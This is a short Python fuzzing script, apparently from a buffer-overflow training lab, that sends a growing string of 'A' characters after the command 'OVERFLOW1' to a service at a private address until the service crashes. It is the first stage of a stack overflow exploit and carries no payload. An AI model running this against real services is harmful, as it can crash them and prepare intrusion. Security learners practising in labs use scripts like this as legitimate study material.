#!/usr/bin/env python3

import socket, sys, time

host = "10.10.10.80"
port = 1337

timeout = 5
prefix = "OVERFLOW1 "

fuzzing_string = prefix + "A" * 100

while True:
	try: 
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((host, port))
			s.recv(1024)
			print("Fuzzing with {} bytes".format(len(fuzzing_string) - len(prefix)))
			s.send(bytes(fuzzing_string, "latin-1"))
			s.recv(1024)
	except:
		print("Fuzzing crashed at {} bytes".format(len(fuzzing_string) - len(prefix)))
		sys.exit(0)
	fuzzing_string += "A" * 10